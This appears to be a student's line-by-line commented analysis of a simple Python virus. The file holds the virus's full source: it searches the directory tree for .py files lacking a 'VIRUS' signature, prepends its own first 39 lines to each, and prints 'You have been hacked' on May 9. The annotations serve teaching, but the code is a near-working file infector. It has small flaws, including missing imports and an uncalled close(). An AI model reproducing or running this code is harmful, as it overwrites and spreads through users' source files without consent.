#Analysis by: Sam Allan
#Date: 06/06/2023

#Defining variable "SIGNATURE" to hold the string "VIRUS"
SIGNATURE = "VIRUS"
#Defining a function called locate with the parameter "path"
def locate(path):
    #setting variable "files_targeted" to hold an empty list
    files_targeted = []
    #setting variable "filelist" to hold os.listdir, a function provided by the OS module that prints the names of all files present in the specified path, which in this case is whatever argument is called with the function
    filelist = os.listdir(path)
    #for each filename in the list provided in the variable above, do the following:
    for fname in filelist:
        #if the directory in question is an existing directory or a file. If it is a directory, do the following: 
        if os.path.isdir(path+"/"+fname):
            # recursively locate all files within the directory
            files_targeted.extend(locate(path+"/"+fname))
        #otherwise, if the file is a python file (if the last three characters of the file name are ".py")
        elif fname[-3:] == ".py":
            #set variable infected to equal False value
            infected = False
            #for each line in the current file
            for line in open(path+"/"+fname):
                #check to see if the virus's signature is on any lines in the file
                if SIGNATURE in line:
                    #if the signature is found, infected variable is set to True value
                    infected = True
                    #ends the process for the current file.
                    break
                #however, if infected variable is equal to false (any files that end in .py that do not have the viral signature)
            if infected == False:
                #add the filepath to the target list
                files_targeted.append(path+"/"+fname)
    #return the completed list of files to target once all have been scanned
    return files_targeted
#defining function "infect" to begin the attack on the target list
def infect(files_targeted):
    #setting variable virus to hold the absolute path for each file in the list
    virus = open(os.path.abspath(__file__))
    #setting variable virusstring to hold an empty string
    virusstring = ""
    #for the index and content of each line in the filepath set earlier, 
    for i,line in enumerate(virus):
        #if the index of the current line is between 0 and 39
        if 0 <= i < 39:
            #append it to the virusstring variable
            virusstring += line
    #close the current file
    virus.close
    #for each filename in the target list
    for fname in files_targeted:
        #setting variable f to open the file
        f = open(fname)
        #setting temp variable to read its contents
        temp = f.read()
        #closing it
        f.close()
        #setting f variable to open the file in write mode
        f = open(fname,"w")
        #tack on the virusstring contents at the start of the file's contents from our variable earlier
        f.write(virusstring + temp)
        #close the file
        f.close()
#defining function detonate with empty parameters 
def detonate():
    #if the current date and time is may 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        #print "you've been hacked" to the terminal
        print("You have been hacked")
#files targeted variable being set by our locate function from earlier, within the current directory
files_targeted = locate(os.path.abspath(""))
#using infect function to corrupt the contents of the files in our list
infect(files_targeted)
#using detonate variable to inform the user of their misfortune.
detonate()
